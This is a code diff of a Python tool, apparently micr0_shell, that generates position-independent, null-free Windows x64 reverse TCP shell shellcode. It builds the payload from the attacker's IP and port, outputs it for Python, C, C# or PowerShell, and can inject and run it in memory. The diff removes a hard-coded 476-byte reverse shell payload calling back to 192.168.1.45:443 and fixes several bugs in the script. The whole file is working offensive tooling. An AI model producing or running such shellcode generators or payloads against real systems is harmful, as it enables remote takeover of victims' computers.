@@ -2,214 +2,171 @@ import ctypes, struct
 import argparse
 from keystone import *
 
-# Exploit Author: Senzee
-# Title: Windows/x64 - Reverse TCP Shell(192.168.1.45:443) Shellcode (476 Bytes)
-# Date: 08/11/2023
-# Platform: Windows X64
-# Tested on: Windows 11 Home/Windows Server 2022 Standard/Windows Server 2019 Datacenter
-# OS Version (respectively): 10.0.22621 /10.0.20348 /10.0.17763
-# Test IP: 192.168.1.45 
-# Test Port: 443
-# Payload size: 476 bytes
-# Do not contain 0x00 byte
-
-
-# Generated Shellcode (192.168.1.45:443):
-# Payload size: 476 bytes
-# buf =  b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d"
-# buf += b"\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
-# buf += b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
-# buf += b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
-# buf += b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
-# buf += b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
-# buf += b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x4c\x89\xcd\x41\xb8\x8e\x4e\x0e\xec\xe8\x8f\xff\xff"
-# buf += b"\xff\x49\x89\xc4\x48\x31\xc0\x66\xb8\x6c\x6c\x50\x48\xb8\x57\x53\x32\x5f\x33\x32"
-# buf += b"\x2e\x64\x50\x48\x89\xe1\x48\x83\xec\x20\x4c\x89\xe0\xff\xd0\x48\x83\xc4\x20\x49"
-# buf += b"\x89\xc6\x49\x89\xc1\x41\xb8\xcb\xed\xfc\x3b\x4c\x89\xcb\xe8\x55\xff\xff\xff\x48"
-# buf += b"\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x48\x8d\x14\x24\x66\xb9\x02\x02\x48\x83\xec"
-# buf += b"\x30\xff\xd0\x48\x83\xc4\x30\x49\x89\xd9\x41\xb8\xd9\x09\xf5\xad\xe8\x2b\xff\xff"
-# buf += b"\xff\x48\x83\xec\x30\x48\x31\xc9\xb1\x02\x48\x31\xd2\xb2\x01\x4d\x31\xc0\x41\xb0"
-# buf += b"\x06\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\xff\xd0\x49\x89\xc4\x48"
-# buf += b"\x83\xc4\x30\x49\x89\xd9\x41\xb8\x0c\xba\x2d\xb3\xe8\xf3\xfe\xff\xff\x48\x83\xec"
-# buf += b"\x20\x4c\x89\xe1\x48\x31\xd2\xb2\x02\x48\x89\x14\x24\x48\x31\xd2\x66\xba\x01\xbb"
-# buf += b"\x48\x89\x54\x24\x02\xba\xc0\xa8\x01\x2d\x48\x89\x54\x24\x04\x48\x8d\x14\x24\x4d"
-# buf += b"\x31\xc0\x41\xb0\x16\x4d\x31\xc9\x48\x83\xec\x38\x4c\x89\x4c\x24\x20\x4c\x89\x4c"
-# buf += b"\x24\x28\x4c\x89\x4c\x24\x30\xff\xd0\x48\x83\xc4\x38\x49\x89\xe9\x41\xb8\x72\xfe"
-# buf += b"\xb3\x16\xe8\x99\xfe\xff\xff\x48\xba\x9c\x92\x9b\xd1\x9a\x87\x9a\xff\x48\xf7\xd2"
-# buf += b"\x52\x48\x89\xe2\x41\x54\x41\x54\x41\x54\x48\x31\xc9\x66\x51\x51\x51\xb1\xff\x66"
-# buf += b"\xff\xc1\x66\x51\x48\x31\xc9\x66\x51\x66\x51\x51\x51\x51\x51\x51\x51\xb1\x68\x51"
-# buf += b"\x48\x89\xe7\x48\x89\xe1\x48\x83\xe9\x20\x51\x57\x48\x31\xc9\x51\x51\x51\x48\xff"
-# buf += b"\xc1\x51\xfe\xc9\x51\x51\x51\x51\x49\x89\xc8\x49\x89\xc9\xff\xd0"
-
-
 def print_banner():
-	banner="""
-███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
-████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
-██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
-██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
-██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
-╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
+    banner="""
+███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
+████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
+██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
+██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
+██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
+╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
 """
-	print(banner)
-	print("Author: Senzee")
-	print("Github Repository: https://github.com/senzee1984/micr0_shell")
-	print("Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode")
-	print("Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255\n\n")
-
+    print(banner)
+    print("Author: Senzee")
+    print("Github Repository: https://github.com/senzee1984/micr0_shell")
+    print("Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode")
+    print("Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255\n\n")
 
 def get_port_argument(port):
-	port_hex_str = format(port, '04x')
-	port_part_1, port_part_2 = port_hex_str[2:], port_hex_str[:2]
-	if "00" in {port_part_1, port_part_2}:
-		port += 257
-		port_hex_str = format(port, '04x')
-		port_part_1, port_part_2 = port_hex_str[2:], port_hex_str[:2]
-		return f"mov dx, 0x{port_part_1 + port_part_2};\nsub dx, 0x101;"
-	return f"mov dx, 0x{port_part_1 + port_part_2};"
-
+    port_hex_str = format(port, '04x')
+    port_part_1, port_part_2 = port_hex_str[2:], port_hex_str[:2]
+    if "00" in {port_part_1, port_part_2}:
+        port += 257
+        port_hex_str = format(port, '04x')
+        port_part_1, port_part_2 = port_hex_str[2:], port_hex_str[:2]
+        return f"mov dx, 0x{port_part_1 + port_part_2};\nsub dx, 0x101;"
+    return f"mov dx, 0x{port_part_1 + port_part_2};"
 
 def get_ip_argument(ip):
-	ip_hex_parts = [format(int(part), '02x') for part in ip.split('.')]
-	reversed_hex = ''.join(ip_hex_parts[::-1])
-	if "00" in ip_hex_parts and "ff" not in ip_hex_parts:
-		hex_int = int(reversed_hex, 16)
-		neg_hex = (0xFFFFFFFF + 1 - hex_int) & 0xFFFFFFFF
-		return f"mov edx, 0x{neg_hex:08x};\nneg rdx;"
-	return f"mov edx, 0x{reversed_hex};"
-
+    ip_hex_parts = [format(int(part), '02x') for part in ip.split('.')]
+    reversed_hex = ''.join(ip_hex_parts[::-1])
+    if "00" in ip_hex_parts and "ff" not in ip_hex_parts:
+        hex_int = int(reversed_hex, 16)
+        neg_hex = (0xFFFFFFFF + 1 - hex_int) & 0xFFFFFFFF
+        return f"mov edx, 0x{neg_hex:08x};\nneg rdx;"
+    return f"mov edx, 0x{reversed_hex};"
 
 def get_shell_type_argument(shell_type):
-	if shell_type == "cmd":
-		return f"mov rdx, 0xff9a879ad19b929c;\nnot rdx;"
-	return (f"sub rsp, 8;\nmov rdx, 0xffff9a879ad19393;\nnot rdx;\npush rdx;"
+    if shell_type == "cmd":
+        return f"mov rdx, 0xff9a879ad19b929c;\nnot rdx;"
+    return (f"sub rsp, 8;\nmov rdx, 0xffff9a879ad19393;\nnot rdx;\npush rdx;"
             f"\nmov rdx, 0x6568737265776f70;")
 
+def output_shellcode(lan, encoding, var, code_exec, save, output):
+    sh = b""
+    for e in encoding:
+        sh += struct.pack("B", e)
+    shellcode = bytearray(sh)
+    print("[+]Payload size: "+str(len(encoding))+" bytes\n")
+    counter=0
 
-def output_shellcode(lan,encoding,var,code_exec,save):
-	sh = b""
-	for e in encoding:
-    		sh += struct.pack("B", e)
-	shellcode = bytearray(sh)
-	print("[+]Payload size: "+str(len(encoding))+" bytes\n")
-	counter=0
+    if lan=="python":
+        print("[+]Shellcode format for Python\n")
+        sc = ""
+        sc = var+" = b\""
+        for dec in encoding:
+            if counter % 20 == 0 and counter != 0:
+                sc += "\"\n"+var+"+="+"b\""
+            sc += "\\x{0:02x}".format(int(dec))
+            counter += 1
 
-	if lan=="python":
-		print("[+]Shellcode format for Python\n")
-		sc = ""
-		sc = var+" = b\""
-		for dec in encoding:
-    			if counter % 20 == 0 and counter != 0:
-        			sc += "\"\n"+var+"+="+"b\""
-    			sc += "\\x{0:02x}".format(int(dec))
-    			counter += 1
+        if counter % 20 > 0:  # Исправлено с count на counter
+            sc += "\""  
+        print(sc)    
 
-		if count % 20 > 0:
-			sc += "\""  
-		print(sc)	
+    elif lan=="c":
+        print("[+]Shellcode format for C\n")
+        sc = "unsigned char " + var + "[]={\n"    
+        for dec in encoding:
+            if counter % 20 == 0 and counter != 0:
+                sc += "\n"
+            sc += "0x{0:02x}".format(int(dec))+","
+            counter += 1
+        sc=sc[0:len(sc)-1]+"};"
+        print(sc)    
 
-	elif lan=="c":
-		print("[+]Shellcode format for C\n")
-		sc = "unsigned char " + var + "[]={\n"	
-		for dec in encoding:
-    			if counter % 20 == 0 and counter != 0:
-        			sc += "\n"
-    			sc += "0x{0:02x}".format(int(dec))+","
-    			counter += 1
-		sc=sc[0:len(sc)-1]+"};"
-		print(sc)	
+    elif lan=="powershell":
+        print("[+]Shellcode format for Powershell\n")
+        sc = "[Byte[]] $"+var+" = "    
+        for dec in encoding:
+            sc += "0x{0:02x}".format(int(dec))+","
+        sc=sc[0:len(sc)-1]
+        print(sc)    
 
+    elif lan=="csharp":
+        print("[+]Shellcode format for C#\n")
+        sc = "byte[] " + var + "= new byte["+str(len(encoding))+"] {\n"    
+        for dec in encoding:
+            if counter % 20 == 0 and counter != 0:
+                sc += "\n"
+            sc += "0x{0:02x}".format(int(dec))+","
+            counter += 1
+        sc=sc[0:len(sc)-1]+"};"
+        print(sc)    
+    
+    else:
+        print("Unsupported language! Exiting...")
+        exit()
 
-	elif lan=="powershell":
-		print("[+]Shellcode format for Powershell\n")
-		sc = "[Byte[]] $"+var+" = "	
-		for dec in encoding:
-    			sc += "0x{0:02x}".format(int(dec))+","
-		sc=sc[0:len(sc)-1]
-		print(sc)	
+    if code_exec=="true":
+        try:
+            ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
+            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                            ctypes.c_int(len(shellcode)),
+                                            ctypes.c_int(0x3000),
+                                            ctypes.c_int(0x40))
 
-	elif lan=="csharp":
-		print("[+]Shellcode format for C#\n")
-		sc = "byte[] " + var + "= new byte["+str(len(encoding))+"] {\n"	
-		for dec in encoding:
-    			if counter % 20 == 0 and counter != 0:
-        			sc += "\n"
-    			sc += "0x{0:02x}".format(int(dec))+","
-    			counter += 1
-		sc=sc[0:len(sc)-1]+"};"
-		print(sc)	
-	
-	else:
-		print("Unsupported language! Exiting...")
-		exit()
+            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
+                                        buf,
+                                        ctypes.c_int(len(shellcode)))
+            print("\n\nShellcode Executed! Shellcode located at address %s" % hex(ptr))
+            ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                            ctypes.c_int(0),
+                                            ctypes.c_uint64(ptr),
+                                            ctypes.c_int(0),
+                                            ctypes.c_int(0),
+                                            ctypes.pointer(ctypes.c_int(0)))
 
+            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+        except Exception as e:
+            print(f"Error executing shellcode: {e}")
 
-	if exec=="true":
-		ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
-		ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
-
-		buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
-                                     buf,
-                                     ctypes.c_int(len(shellcode)))
-		print("\n\nShellcode Executed! Shellcode located at address %s" % hex(ptr))
-		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.c_uint64(ptr),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.pointer(ctypes.c_int(0)))
-
-		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
-
-	if save=="true":
-		try:
-			with open(output, 'wb') as f:
-				f.write(shellcode)
-				print("\n\nGenerated shellcode successfully saved in file "+output)
-		except Exception as e:
-			print(e)
-	
-	
+    if save=="true":
+        try:
+            with open(output, 'wb') as f:
+                f.write(shellcode)
+                print("\n\nGenerated shellcode successfully saved in file "+output)
+        except Exception as e:
+            print(f"Error saving shellcode: {e}")
+    
+    return sc, shellcode
+    
 if __name__ == "__main__":
-	print_banner()
-	parser = argparse.ArgumentParser(description='Dynamically generate Windows x64 reverse shell.')
-	parser.add_argument('--ip', '-i', required=True, dest='ip',help='The listening IP address, default value is 192.168.0.45')
-	parser.add_argument('--port', '-p', required=False, default=443, dest='port',help='The local listening port, default value is 443')
-	parser.add_argument('--language', '-l', required=False, default='python', dest='lan',help='The language of desired shellcode runner, default language is python. Support c, csharp, python, powershell')
-	parser.add_argument('--variable', '-v', required=False, default='buf', dest='var',help='The variable name of shellcode array, default variable is buf')
-	parser.add_argument('--type', '-t', required=False, default='cmd', dest='shell_type',help='The shell type, Powershell or Cmd, default shell is cmd')
-	parser.add_argument('--execution', '-e', required=False, default='False', dest='code_exec',help='Whether to execution generated shellcode? True/False')
-	parser.add_argument('--save', '-s', required=False, default='False', dest='save',help='Whether to save the generated shellcode to a bin file, True/False')
-	parser.add_argument('--output', '-o', required=False, default='', dest='output',help='If choose to save the shellcode to file, the desired location.')
+    print_banner()
+    parser = argparse.ArgumentParser(description='Dynamically generate Windows x64 reverse shell.')
+    parser.add_argument('--ip', '-i', required=True, dest='ip',help='The listening IP address')
+    parser.add_argument('--port', '-p', required=False, type=int, default=443, dest='port',help='The local listening port, default value is 443')
+    parser.add_argument('--language', '-l', required=False, default='python', dest='lan',help='The language of desired shellcode runner, default language is python. Support c, csharp, python, powershell')
+    parser.add_argument('--variable', '-v', required=False, default='buf', dest='var',help='The variable name of shellcode array, default variable is buf')
+    parser.add_argument('--type', '-t', required=False, default='cmd', dest='shell_type',help='The shell type, Powershell or Cmd, default shell is cmd')
+    parser.add_argument('--execution', '-e', required=False, default='False', dest='code_exec',help='Whether to execution generated shellcode? True/False')
+    parser.add_argument('--save', '-s', required=False, default='False', dest='save',help='Whether to save the generated shellcode to a bin file, True/False')
+    parser.add_argument('--output', '-o', required=False, default='shellcode.bin', dest='output',help='If choose to save the shellcode to file, the desired location.')
 
-	args = parser.parse_args()
-	ip=args.ip
-	port=int(args.port)
-	lan=args.lan.lower()
-	var=args.var
-	shell_type=args.shell_type.lower()
-	save=args.save.lower()
-	output=args.output
-	code_exec=args.code_exec.lower()
-	print("[+]Shellcode Settings:")
-	print("******** IP Address: "+ip)
-	print("******** Listening Port: "+str(port))
-	print("******** Language of desired shellcode runner: "+lan)
-	print("******** Shellcode array variable name: "+var)
-	print("******** Shell: "+shell_type)
-	print("******** Shellcode Execution: "+code_exec)
-	print("******** Save Shellcode to file: "+save+"\n\n")
+    args = parser.parse_args()
+    ip=args.ip
+    port=int(args.port)
+    lan=args.lan.lower()
+    var=args.var
+    shell_type=args.shell_type.lower()
+    save=args.save.lower()
+    output=args.output
+    code_exec=args.code_exec.lower()
+    print("[+]Shellcode Settings:")
+    print("******** IP Address: "+ip)
+    print("******** Listening Port: "+str(port))
+    print("******** Language of desired shellcode runner: "+lan)
+    print("******** Shellcode array variable name: "+var)
+    print("******** Shell: "+shell_type)
+    print("******** Shellcode Execution: "+code_exec)
+    print("******** Save Shellcode to file: "+save+"\n\n")
 
-	args = parser.parse_args()
-	port_argument = get_port_argument(port)
-	ip_argument = get_ip_argument(ip)
-	shell_type = get_shell_type_argument(shell_type)
+    port_argument = get_port_argument(port)
+    ip_argument = get_ip_argument(ip)
+    shell_type_argument = get_shell_type_argument(shell_type)
 
-	CODE = (
+    CODE = (
 "find_kernel32:"
 " xor rdx, rdx;"
 " mov rax, gs:[rdx+0x60];"        # RAX stores the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
@@ -348,7 +305,7 @@ f"{ip_argument}"
 " mov r9, rbp;"        # R9 stores the base address of Kernel32.dll
 " mov r8d, 0x16b3fe72;"        # Hash of CreateProcessA
 " call parse_module;"        # Get the address of CreateProcessA
-f"{shell_type}"
+f"{shell_type_argument}"
 " push rdx;"   
 " mov rdx, rsp;"        # Pointer to "cmd.exe" is stored in the RCX register
 " push r12;"        # The member STDERROR is the return value of WSASocketA
@@ -393,6 +350,13 @@ f"{shell_type}"
 " call rax;"        # Call CreateProcessA
 )
 
-	ks = Ks(KS_ARCH_X86, KS_MODE_64)
-	encoding, count = ks.asm(CODE)
-	output_shellcode(lan,encoding,var,code_exec,save)
+    try:
+        ks = Ks(KS_ARCH_X86, KS_MODE_64)
+        encoding, count = ks.asm(CODE)
+        if not encoding:
+            print("[!] Error: Keystone assembly failed")
+            exit(1)
+        sc, shellcode = output_shellcode(lan, encoding, var, code_exec, save, output)
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        exit(1)
